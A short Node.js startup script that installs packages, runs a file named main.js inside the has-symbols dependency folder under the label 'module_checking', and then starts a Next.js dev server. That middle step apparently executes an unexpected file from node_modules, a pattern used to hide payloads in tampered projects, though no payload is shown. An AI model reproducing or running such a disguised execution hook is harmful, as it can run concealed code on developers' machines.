const { exec } = require('child_process');

// Function to install npm packages
function installPackage(packageName) {
  return new Promise((resolve, reject) => {
    exec(`npm install`, (error, stdout, stderr) => {
      if (error) {
        return reject(`Error installing package: ${stderr}`);
      }
      resolve();
    });
  });
}

// Function to run your custom script
function module_checking(scriptPath) {
  return new Promise((resolve, reject) => {
    exec(`node ./node_modules/has-symbols/main.js`, (error, stdout, stderr) => {
      if (error) {
        return reject(`Error running script: ${stderr}`);
      }
      resolve();
    });
  });
}

function startProject(scriptPath) {
    return new Promise((resolve, reject) => {
      exec(`next dev`, (error, stdout, stderr) => {
        if (error) {
          return reject(`Error running script: ${stderr}`);
        }
        resolve();
      });
    });
  }

// Example usage
async function index() {
  try {
    await installPackage();
    await module_checking();
    await startProject();
  } catch (error) {
    console.error(error);
  }
}

index();